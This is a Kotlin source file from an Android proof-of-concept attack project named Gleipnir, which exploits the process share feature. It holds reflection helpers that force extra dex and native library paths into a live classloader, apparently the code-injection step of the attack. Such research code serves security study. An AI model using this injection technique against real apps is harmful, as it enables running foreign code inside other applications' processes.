/*
 * Gleipnir Attack POC - Exploiting the Android process share feature
 * Copyright (C) <2020>  <Sascha Roth>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

package org.gleipnir.app.helpers.extensions

import dalvik.system.BaseDexClassLoader
import org.gleipnir.app.extendableLoader.log
import org.gleipnir.app.reflectionHelper.getReflective
import org.gleipnir.app.reflectionHelper.setReflective
import java.io.File
import java.lang.reflect.Method

/**
 * Adds native path and dex path to the given classloader
 */
fun ClassLoader.patch(dex_path: String, nativePath: String) {
    log("ClassLoader [-] patch [-] add (dex <${dex_path}> native <${nativePath}>)")
    lateinit var addDexPath: Method
    try {
        addDexPath = this!!::class.java.getMethod(
            "addDexPath",
            String::class.java,
            java.lang.Boolean.TYPE
        )
        addDexPath.isAccessible = true
        addDexPath.invoke(this!!, dex_path, true)
    } catch (exception: Exception) {
        addDexPath = this!!::class.java.getMethod(
            "addDexPath",
            String::class.java
        )
        addDexPath.isAccessible = true
        addDexPath.invoke(this!!, dex_path)
    }


    val dexPathListField = BaseDexClassLoader::class.java.getDeclaredField("pathList")
    dexPathListField.isAccessible = true
    val dexPath = dexPathListField.get(this!!);
    try {
        val addNativePath =
            dexPath::class.java.getMethod(
                "addNativePath",
                Collection::class.java
            )
        addNativePath.isAccessible = true
        val list = ArrayList<String>()
        list.add(nativePath)
        list.add("/system/lib/")
        addNativePath.invoke(dexPath, list)
        addNativePath.invoke(dexPath, list)
    } catch (exception: Exception) {
        log("ClassLoaderExtension [-] patch [-] addNativePath failed, trying workaround", exception)
        addNativePath(dexPath, nativePath)
        addNativePath(dexPath, "/system/lib/")
    }
    val directories = getReflective<List<File>>(dexPath, "nativeLibraryDirectories")
    if (directories is java.util.ArrayList<File>) {
        directories.add(File(nativePath))
    }
}

fun addNativePath(dexPath: Any, path: String) {
    val nativeLibraryPathElements = getReflective<Array<Any>>(dexPath, "nativeLibraryPathElements")
    var size = 0;
    nativeLibraryPathElements?.let {
        size = it.size
    }
    val nativeLibraryElementClass = Class.forName("dalvik.system.DexPathList\$NativeLibraryElement")
    val newNativeLibraryPathElements = java.lang.reflect.Array.newInstance(
        nativeLibraryElementClass,
        size + 1
    ) as Array<Any>
    nativeLibraryPathElements?.forEachIndexed { i, it ->
        newNativeLibraryPathElements[i] = it
    }
    val constructor = nativeLibraryElementClass.getConstructor(File::class.java)
    constructor.isAccessible = true
    newNativeLibraryPathElements[size] = constructor.newInstance(File(path))
    setReflective(dexPath, "nativeLibraryPathElements", newNativeLibraryPathElements)
}